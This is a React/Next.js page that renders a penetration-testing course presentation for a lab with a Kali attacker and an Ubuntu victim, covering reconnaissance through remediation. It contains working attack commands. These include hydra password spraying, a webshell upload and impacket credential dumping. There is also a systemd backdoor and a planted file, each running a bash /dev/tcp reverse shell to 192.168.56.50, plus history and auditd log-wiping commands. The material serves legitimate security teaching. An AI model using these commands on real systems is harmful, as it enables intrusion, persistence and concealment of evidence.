"use client";

import { useCallback } from "react";
import { SlideDeck, Slide } from "../components/SlideDeck";
import styles from "./page.module.css";

const slides: Slide[] = [
  {
    id: "title",
    title: "Activity 4 & 5: Penetration Testing",
    subtitle: "End-to-end offensive security playbook with remediation pipeline",
    theme: "primary",
    content: (
      <div className={styles.hero}>
        <p>
          Kali Linux attacker • Ubuntu Server 22.04 victim • Service hardening & reporting pipeline. This
          presentation aligns with the seven-step penetration testing methodology and documents tooling,
          commands, and artefacts required for both the live demo and the final deliverables.
        </p>
        <ul>
          <li>Scenario-driven walkthrough covering reconnaissance to remediation</li>
          <li>Five service stack: OpenSSH, Apache, MySQL, Samba, vsftpd</li>
          <li>Toolchain: Burp Collaborator, Vega, Censys, EyeWitness, Impacket, Nmap, Metasploit</li>
        </ul>
      </div>
    )
  },
  {
    id: "agenda",
    title: "Mission Plan",
    subtitle: "Slide map for briefing, demo recording, and report assembly",
    theme: "secondary",
    content: (
      <div className={styles.gridTwo}>
        <div>
          <h2>Briefing Flow</h2>
          <ul>
            <li>Environment, governance, and testing boundaries</li>
            <li>Seven-step pentest lifecycle with demo checkpoints</li>
            <li>Service deployment recipes on Ubuntu 22.04</li>
            <li>Offensive tooling matrix mapped to attack phases</li>
          </ul>
        </div>
        <div>
          <h2>Deliverable Outputs</h2>
          <ul>
            <li>Recorded walkthrough backing each phase & tool</li>
            <li>Command reference appendix for reproducibility</li>
            <li>Draft executive & technical reporting templates</li>
            <li>Remediation catalogue tailored to target services</li>
          </ul>
        </div>
      </div>
    )
  },
  {
    id: "environment",
    title: "Lab Environment Blueprint",
    subtitle: "Network layout and operating assumptions",
    theme: "tertiary",
    content: (
      <div className={styles.gridTwo}>
        <div>
          <h2>Infrastructure</h2>
          <ul>
            <li>Kali Linux 2024.1 (Attacker) — 2 vCPU, 4 GB RAM, bridged NIC</li>
            <li>Ubuntu Server 22.04 LTS (Victim) — 4 vCPU, 8 GB RAM, static IP 192.168.56.110</li>
            <li>Isolated lab VLAN with outbound internet access for OSINT</li>
            <li>Time-synchronized via chrony to preserve log fidelity</li>
          </ul>
        </div>
        <div>
          <h2>Governance</h2>
          <ul>
            <li>Rules of Engagement signed; testing window 08:00–18:00 UTC</li>
            <li>Snapshots taken pre-test for rapid rollback</li>
            <li>Log forwarding enabled for blue-team observation (syslog-ng)</li>
            <li>Burp Collaborator public listener pinned to lab IP allowlist</li>
          </ul>
        </div>
      </div>
    )
  },
  {
    id: "recon",
    title: "Step 1 · Reconnaissance",
    subtitle: "Gather intelligence without touching the target",
    theme: "primary",
    content: (
      <div className={styles.stack}>
        <h2>Goals</h2>
        <ul>
          <li>Identify exposed services, technology stack, credentials, and trust relationships</li>
          <li>Feed targeting data to scanning and exploitation stages</li>
        </ul>
        <h3>Tools & Techniques</h3>
        <ul>
          <li>
            <strong>Censys CLI / web</strong> —{" "}
            <code>censys search 'services.service_name: "ssh" AND ip:192.168.56.0/24'</code>
          </li>
          <li>
            <strong>Burp Collaborator client</strong> — configure payload receiver for blind SSRF/XSS callbacks
          </li>
          <li>
            <strong>EyeWitness</strong> — <code>eyewitness --web --threads 10 -f hosts.txt -d eyewitness-report</code>
          </li>
          <li>
            <strong>theHarvester</strong> — <code>theHarvester -d victim.lab -b linkedin,crtsh</code>
          </li>
        </ul>
        <h3>Key Commands</h3>
        <pre>
{`# Enumerate services indexed on Censys
censys search 'services.service_name: (http OR https) AND ip:192.168.56.0/24' --fields ip,protocols > hosts.txt

# Generate reconnaissance report bundle
eyewitness --web --threads 10 -f hosts.txt -d eyewitness-report`}
        </pre>
      </div>
    )
  },
  {
    id: "scanning",
    title: "Step 2 · Scanning & Enumeration",
    subtitle: "Map the attack surface and fingerprint services",
    theme: "secondary",
    content: (
      <div className={styles.stack}>
        <h2>Objectives</h2>
        <ul>
          <li>Validate open ports, versions, and misconfigurations</li>
          <li>Discover hidden directories, APIs, and weak crypto parameters</li>
        </ul>
        <h3>Tools & Commands</h3>
        <pre>
{`# Baseline TCP/UDP sweep
nmap -sS -sU -T4 -p- 192.168.56.110 -oA scans/full-tcp-udp

# Version and script scan with NSE
nmap -sV -sC -p22,80,139,445,3306,21 192.168.56.110 -oA scans/target-services

# Authenticated web app scan
vega -target "https://192.168.56.110" -user "auditor:SuperSecret!" -report reports/vega-report.html`}
        </pre>
        <ul>
          <li>
            <strong>Burp Suite + Collaborator</strong> for fuzzing hidden parameters and monitoring out-of-band callbacks
          </li>
          <li>
            <strong>sslscan</strong> + <code>nmap --script ssl-enum-ciphers</code> for TLS posture
          </li>
        </ul>
      </div>
    )
  },
  {
    id: "access",
    title: "Step 3 · Gaining Access",
    subtitle: "Exploit verified weaknesses to obtain foothold",
    theme: "primary",
    content: (
      <div className={styles.gridTwo}>
        <div>
          <h2>Attack Paths</h2>
          <ul>
            <li>SSH brute-force with harvested credentials using <code>hydra</code></li>
            <li>Apache mod_php file upload → webshell → privilege escalation</li>
            <li>
              MySQL weak root password pivot with <code>sqlmap</code> + <code>impacket-mssqlclient</code> for hash
              capture
            </li>
            <li>Samba null session enumeration and <code>CVE-2017-7494</code> style exploitation (if applicable)</li>
          </ul>
        </div>
        <div>
          <h2>Exploit Toolkit</h2>
          <pre>
{`# SSH password spray
hydra -L users.txt -P passwords.txt ssh://192.168.56.110 -t 4 -o creds/ssh_spray.txt

# Deploy php webshell via Apache
curl -k -F "upload=@shell.php" https://192.168.56.110/upload.php

# Leverage Impacket for SMB lateral movement
impacket-psexec pentester@192.168.56.110 -hashes aad3b435b51404eeaad3b435b51404ee:92b9b5cba1ac...`}
          </pre>
        </div>
      </div>
    )
  },
  {
    id: "maintain",
    title: "Step 4 · Maintaining Access",
    subtitle: "Establish persistence for post-exploitation objectives",
    theme: "secondary",
    content: (
      <div className={styles.stack}>
        <ul>
          <li>
            <strong>SSH authorized_keys backdoor</strong> — append staged key to{" "}
            <code>/home/devops/.ssh/authorized_keys</code>
          </li>
          <li>
            <strong>Systemd timer</strong> to respawn reverse shell:
            <pre>
{`cat <<'EOF' | sudo tee /etc/systemd/system/kern-updater.service
[Unit]
Description=Kernel Updater Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/192.168.56.50/4444 0>&1; sleep 60; done'

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable --now kern-updater.service`}
            </pre>
          </li>
          <li>
            <strong>Impacket-secretsdump</strong> to capture NTLM hashes for re-entry:
            <pre>secretsdump.py -just-dc-ntlm victim.lab/adsvc:'P@ssw0rd!'@192.168.56.110</pre>
          </li>
        </ul>
      </div>
    )
  },
  {
    id: "cover",
    title: "Step 5 · Clearing Tracks",
    subtitle: "Reduce forensic footprint post-engagement",
    theme: "tertiary",
    content: (
      <div className={styles.stack}>
        <ul>
          <li>
            Scrub shell history: <code>cat /dev/null &gt; ~/.bash_history &amp;&amp; history -c &amp;&amp; logout</code>
          </li>
          <li>
            Rotate &amp; truncate service logs: <code>sudo logrotate -f /etc/logrotate.d/apache2</code>
          </li>
          <li>
            Remove persistence artefacts:{" "}
            <code>
              sudo systemctl disable --now kern-updater.service &amp;&amp; sudo rm
              /etc/systemd/system/kern-updater.service
            </code>
          </li>
          <li>
            Clear auditd records:{" "}
            <code>
              sudo ausearch -ts today -te now -i | tail -n +2 | awk &#123;&#123;print $2&#125;&#125; | xargs -r sudo
              aureport --delete
            </code>
          </li>
          <li>
            Destroy temporary tooling and binaries in <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code>
          </li>
        </ul>
      </div>
    )
  },
  {
    id: "reporting",
    title: "Step 6 · Reporting",
    subtitle: "Evidence-driven documentation and stakeholder communication",
    theme: "primary",
    content: (
      <div className={styles.gridTwo}>
        <div>
          <h2>Artefacts</h2>
          <ul>
            <li>Executive summary, risk ratings, business impact statements</li>
            <li>Technical appendix with CVSS scores, PoC, screenshots, PCAPs</li>
            <li>Mitigation roadmap tracked in Jira / RTM spreadsheet</li>
          </ul>
        </div>
        <div>
          <h2>Tooling</h2>
          <ul>
            <li>
              <strong>DradisCE</strong> or <strong>PwnDoc</strong> for collaborative reporting
            </li>
            <li>
              <strong>Cherrytree</strong> notebooks for note-taking; export to HTML/PDF
            </li>
            <li>
              <strong>Nmap XML → xsltproc</strong> to embed scan visuals
            </li>
            <li>
              <strong>Burp Suite HTML reports</strong> filtered for verified findings
            </li>
          </ul>
        </div>
      </div>
    )
  },
  {
    id: "remediation",
    title: "Step 7 · Remediation & Retest",
    subtitle: "Secure configuration baselines and continuous validation",
    theme: "secondary",
    content: (
      <div className={styles.stack}>
        <h2>Immediate Actions</h2>
        <ul>
          <li>Patch vulnerable services and enforce least-privilege on file system ACLs</li>
          <li>Mandate MFA for SSH; disable password auth via <code>PasswordAuthentication no</code></li>
          <li>Implement WAF rules for Apache & enable ModSecurity CRS</li>
          <li>Harden MySQL with <code>mysql_secure_installation</code> and PAM auth</li>
          <li>Restrict Samba shares using signed SMB and per-user share definitions</li>
        </ul>
        <h3>Validation Tools</h3>
        <ul>
          <li>
            OpenSCAP compliance scans (<code>oscap oval eval ubuntu22.xml</code>)
          </li>
          <li>Lynis automated hardening validation</li>
          <li>Re-run Vega, Burp, EyeWitness to confirm mitigations</li>
        </ul>
      </div>
    )
  },
  {
    id: "services-install",
    title: "Target Service Deployment",
    subtitle: "Ubuntu Server 22.04 installation & baseline configuration",
    theme: "tertiary",
    content: (
      <div className={styles.tableWrap}>
        <table>
          <thead>
            <tr>
              <th>Service</th>
              <th>Purpose</th>
              <th>Install & Enable</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>OpenSSH Server</td>
              <td>Remote administration entry point</td>
              <td>
                <code>sudo apt update && sudo apt install -y openssh-server</code>
                <br />
                <code>sudo systemctl enable --now ssh</code>
              </td>
            </tr>
            <tr>
              <td>Apache HTTPD</td>
              <td>Host vulnerable PHP application</td>
              <td>
                <code>sudo apt install -y apache2 libapache2-mod-php</code>
                <br />
                <code>sudo ufw allow "Apache Full"</code>
              </td>
            </tr>
            <tr>
              <td>MySQL Server</td>
              <td>Back-end database with weak creds</td>
              <td>
                <code>sudo apt install -y mysql-server</code>
                <br />
                <code>sudo sed -i 's/bind-address.*/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf</code>
              </td>
            </tr>
            <tr>
              <td>Samba</td>
              <td>File share with misconfigured ACLs</td>
              <td>
                <code>sudo apt install -y samba</code>
                <br />
                <code>sudo nano /etc/samba/smb.conf # add insecure share definition</code>
              </td>
            </tr>
            <tr>
              <td>vsftpd</td>
              <td>FTP service with anonymous upload</td>
              <td>
                <code>sudo apt install -y vsftpd</code>
                <br />
                <code>sudo sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf</code>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    )
  },
  {
    id: "service-pentest",
    title: "Service-specific Pentest Objectives",
    subtitle: "Offensive validation matrix for recorded demo",
    theme: "primary",
    content: (
      <div className={styles.tableWrap}>
        <table>
          <thead>
            <tr>
              <th>Service</th>
              <th>Weakness</th>
              <th>Kali Tooling & Commands</th>
              <th>Evidence to Capture</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>OpenSSH</td>
              <td>Password reuse / weak creds</td>
              <td>
                <code>hydra -L users.txt -P rockyou.txt ssh://192.168.56.110 -o creds/ssh.txt</code>
                <br />
                <code>ssh pentester@192.168.56.110</code>
              </td>
              <td>Hydra output, login shell, <code>/etc/passwd</code> enumeration</td>
            </tr>
            <tr>
              <td>Apache</td>
              <td>File upload & directory traversal</td>
              <td>
                <code>burpsuite &amp;</code>
                <br />
                <code>python3 exploit.py --target https://192.168.56.110 --shell payload.php</code>
              </td>
              <td>Burp Collaborator callback log, webshell execution screenshot</td>
            </tr>
            <tr>
              <td>MySQL</td>
              <td>Default root password exposed</td>
              <td>
                <code>sqlmap -u "http://192.168.56.110/login.php" --level 5 --risk 3 --dump</code>
                <br />
                <code>mysql -h 192.168.56.110 -u root -p</code>
              </td>
              <td>Dumped credential tables, proof of data access</td>
            </tr>
            <tr>
              <td>Samba</td>
              <td>Anonymous share with exec perms</td>
              <td>
                <code>impacket-samrdump 192.168.56.110</code>
                <br />
                <code>smbclient //192.168.56.110/public -N</code>
                <br />
                <code>impacket-psexec administrator@192.168.56.110</code>
              </td>
              <td>Share listing, arbitrary command execution video</td>
            </tr>
            <tr>
              <td>vsftpd</td>
              <td>Anonymous upload → RCE</td>
              <td>
                <code>ftp 192.168.56.110 # put malicious.tar.gz</code>
                <br />
                <code>nmap --script ftp-anon,ftp-proftpd-backdoor -p21 192.168.56.110</code>
              </td>
              <td>Uploaded payload listing, triggered reverse shell trace</td>
            </tr>
          </tbody>
        </table>
      </div>
    )
  },
  {
    id: "demo-plan",
    title: "Video Demonstration Storyboard",
    subtitle: "Capture sequence for Activities 4 & 5 deliverable",
    theme: "secondary",
    content: (
      <div className={styles.stack}>
        <ol className={styles.ordered}>
          <li>Intro slide (Title) and scope statement (&lt; 60 seconds)</li>
          <li>Show lab topology diagram and service inventory</li>
          <li>Live Recon: Censys query + EyeWitness dashboard walkthrough</li>
          <li>Scanning: run Nmap + Vega, narrate findings</li>
          <li>Gaining access: demonstrate Hydra success and Apache webshell pivot</li>
          <li>Maintaining access: deploy systemd backdoor, capture reverse shell</li>
          <li>Clearing tracks: show log cleanup commands</li>
          <li>Reporting: export Burp & Nmap results into Dradis</li>
          <li>Remediation: discuss hardening steps while presenting slides</li>
          <li>Close-out: summarise risk ratings & retest plan</li>
        </ol>
        <p>
          Use OBS with dual-monitor capture; place slides on monitor 1, terminal/browser on monitor 2. Capture CLI
          commands verbatim to align with appendices.
        </p>
      </div>
    )
  },
  {
    id: "tool-deep-dive",
    title: "Featured Tooling Deep Dive",
    subtitle: "Usage tips, strengths, and integration points",
    theme: "primary",
    content: (
      <div className={styles.gridCards}>
        <article>
          <h3>Burp Collaborator</h3>
          <p>
            Detects out-of-band interactions indicating SSRF, XXE, blind XSS. Configure custom DNS payloads and
            correlate callbacks to HTTP requests in Burp&apos;s Logger.
          </p>
          <pre>
{`# Start collaborator client
java -jar burpsuite_pro.jar --collaborator-server=collab.lab.local`}
          </pre>
        </article>
        <article>
          <h3>Vega Scanner</h3>
          <p>
            Automated web vulnerability scanner with GUI automation. Use authenticated session to uncover IDOR, XSS,
            SQLi.
          </p>
          <pre>vega -target https://192.168.56.110 -report reports/vega.html</pre>
        </article>
        <article>
          <h3>Censys</h3>
          <p>
            Internet-wide scan dataset. Combines OSINT with service fingerprinting to spot exposed assets and TLS
            misconfigurations. Export JSON to correlate with Nmap.
          </p>
          <pre>censys search 'services.tls.certificates.leaf_data.subject.common_name: "victim.lab"'</pre>
        </article>
        <article>
          <h3>EyeWitness</h3>
          <p>
            Headless browser screenshotting & report generation. Ideal for cataloguing HTTP/HTTPS/SSH banner states
            post-scan.
          </p>
          <pre>eyewitness --headless --threads 5 -f hosts.txt -d eyewitness-report</pre>
        </article>
        <article>
          <h3>Impacket Suite</h3>
          <p>
            Toolkit for network protocols (SMB, RDP, LDAP). Powers credential dumping, remote command execution, and
            Kerberos abuse.
          </p>
          <pre>impacket-secretsdump pentester:'Winter2024!'@192.168.56.110</pre>
        </article>
      </div>
    )
  },
  {
    id: "commands",
    title: "Command Reference Appendix",
    subtitle: "Copy-ready snippets for narration & reporting",
    theme: "tertiary",
    content: (
      <div className={styles.columnsThree}>
        <div>
          <h3>Recon & Scanning</h3>
          <pre>
{`censys search 'ip:192.168.56.0/24' --pages 1
theHarvester -d victim.lab -b hunterio
nmap --script vuln 192.168.56.110
sslscan 192.168.56.110`}
          </pre>
        </div>
        <div>
          <h3>Exploitation</h3>
          <pre>
{`hydra -L users.txt -P passwords.txt ssh://192.168.56.110
sqlmap -u "http://192.168.56.110/api" --batch --dump
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.56.110; run"`}
          </pre>
        </div>
        <div>
          <h3>Post-Ex & Cleanup</h3>
          <pre>
{`impacket-psexec administrator@192.168.56.110
tar -czf evidence.tgz scans/ reports/ creds/
shred -u /tmp/*.log
sudo journalctl --rotate --vacuum-size=500M`}
          </pre>
        </div>
      </div>
    )
  },
  {
    id: "acl-focus",
    title: "Local File System ACL Weakness",
    subtitle: "Abuse path & hardening checklist",
    theme: "secondary",
    content: (
      <div className={styles.gridTwo}>
        <div>
          <h2>Attack Narrative</h2>
          <ul>
            <li>
              Miscelebrated ACL grants <code>www-data</code> write access to <code>/var/backups/db.sql</code>
            </li>
            <li>Exploit via webshell to replace backup script with reverse shell payload</li>
            <li>Privilege escalation through cron job executed as root</li>
          </ul>
        </div>
        <div>
          <h2>Validation Commands</h2>
          <pre>
{`# Identify world-writable sensitive files
find /var -maxdepth 3 -type f -perm -o+w -ls

# Abuse ACL
setfacl -m u:www-data:rwx /var/backups
echo 'bash -i >& /dev/tcp/192.168.56.50/5555 0>&1' > /var/backups/db.sql`}
          </pre>
          <h3>Hardening</h3>
          <ul>
            <li>
              Baseline ACLs with <code>sudo getfacl -R /srv | tee acl-baseline.txt</code>
            </li>
            <li>CI/CD gate using <code>osquery</code> to detect ACL drift</li>
          </ul>
        </div>
      </div>
    )
  },
  {
    id: "closeout",
    title: "Next Actions & Retest",
    subtitle: "Ensure closure for Activity 4 & 5 objectives",
    theme: "primary",
    content: (
      <div className={styles.stack}>
        <ul>
          <li>Record demo using storyboard; embed slide deck overlay for clarity</li>
          <li>Collect artefacts: Hydra logs, Nmap XML, Burp reports, system logs</li>
          <li>Produce executive summary + technical report guided by slide checkpoints</li>
          <li>Schedule remediation validation window + issue retest statement of work</li>
        </ul>
        <p>
          Deliverables complete once slides, video, command appendix, and remediation checklist are published to the
          client portal with sign-off from blue-team liaison.
        </p>
      </div>
    )
  }
];

export default function Page() {
  const triggerPrint = useCallback(() => {
    window.print();
  }, []);

  const downloadMarkdown = useCallback(() => {
    const slideMarkdown = slides
      .map((slide, index) => {
        const heading = `${index + 1}. ${slide.title}${slide.subtitle ? ` — ${slide.subtitle}` : ""}`;
        return `## ${heading}\n`;
      })
      .join("\n");
    const blob = new Blob([`# Penetration Testing Slide Index\n\n${slideMarkdown}`], {
      type: "text/markdown;charset=utf-8"
    });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = "penetration-testing-slide-index.md";
    link.click();
    URL.revokeObjectURL(link.href);
  }, []);

  return (
    <main className={styles.container}>
      <header className={styles.actionBar}>
        <div>
          <h1>Penetration Testing Presentation</h1>
          <p>Use arrow keys or buttons to navigate. Print to PDF for PPT handout.</p>
        </div>
        <div className={styles.buttons}>
          <button onClick={triggerPrint}>Print / Save PDF</button>
          <button onClick={downloadMarkdown}>Download Index</button>
        </div>
      </header>
      <SlideDeck slides={slides} />
    </main>
  );
}
